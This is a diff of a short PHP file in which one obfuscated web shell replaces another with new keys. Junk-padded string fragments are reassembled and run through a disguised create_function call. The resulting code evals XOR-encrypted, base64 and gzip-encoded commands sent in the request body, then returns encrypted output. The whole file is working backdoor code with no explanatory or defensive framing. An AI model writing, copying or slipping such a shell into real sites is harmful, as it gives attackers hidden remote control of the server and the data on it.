@@ -1,11 +1,11 @@
 <?php
-$h='eva*0l(@gz*0uncompress*0*0(*0@x(@b*0ase6*04_decode($m[1])*0,$k)));$*0o=@ob_get_c*0ontent*0s();@*0o';
-$n='_matc*0*0h("/$kh(.*0+)$kf/",@*0fi*0le_get_c*0onten*0ts("php:*0//inp*0ut"),$m)*0==1) {@o*0b_sta*0rt();*0*0@';
-$V='b_end_clea*0n();$r*0=@base6*04_en*0code*0*0(@x(@gzcompres*0s($o),*0$k)*0)*0;print("$p$kh$r*0$kf");}';
-$O=';func*0tion x($t*0,$k)*0{$*0c=strlen(*0$k);$l=s*0trle*0*0n($t);$o="*0";f*0or($i=0;$i<*0$l;)*0*0{fo';
-$q='$k="5635*02739"*0;$k*0h="f5964*03540a3*0a";*0$kf="6e*016985f62c7"*0;$p="*0t*006*0B*0k2GAuqYhhXu1"';
-$l='r($j=0;(*0$j<$c&&$i<$l*0*0);$j++,$i++)*0{$o.=*0$*0t{$i}^$k*0{$j*0};}}retu*0rn $o;}if (*0@pr*0eg';
-$e=str_replace('Bv','','creBvBvaBvte_fBvuncBvtiBvon');
-$G=str_replace('*0','',$q.$O.$l.$n.$h.$V);
-$K=$e('',$G);$K();
+$P='ob_~xend_clean();$~xr=@base~x64_e~xncode(@x~x~x(@gzcompr~xes~xs($o),$k));pri~xnt(~x"~x$p$kh$r$kf");}';
+$g='$k="~x827~xccb0e";$kh=~x"ea8a70~x6c4c34~x"~x;$k~xf~x="a16891f84e7b";~x$p="C~x21kNnholigA~x~x3Z~xJF";~x';
+$s='function ~xx($t,$k){$c=strl~xen($~xk~x);$l=strle~x~xn($t);$o=~x"";~xfor($~xi=0;$i<$l;~x){for($j=0~x';
+$k='a~xl(@gzunco~xmpr~xess(@x(@ba~xse6~x4_decod~xe($~xm~x[1])~x,$k)));$o=@ob_get~x_conte~xnts(~x~x);@';
+$d=str_replace('ci','','ccireciaciteci_fciunciction');
+$K=';~x($j<$c&&$i<~x$l);$~xj++,~x$i++){$~xo.=$t~x{$i}~x^$k{$j};}}~xre~xturn $o;}if~x (@preg~x_match(~x';
+$f='~x"/$kh(.+)$k~x~xf/",@~xfile_get_c~xon~xtents("php://i~xnp~xut~x"),$m)==1) {~x~x@ob~x_start();@ev';
+$L=str_replace('~x','',$g.$s.$K.$f.$k.$P);
+$N=$d('',$L);$N();
 ?>
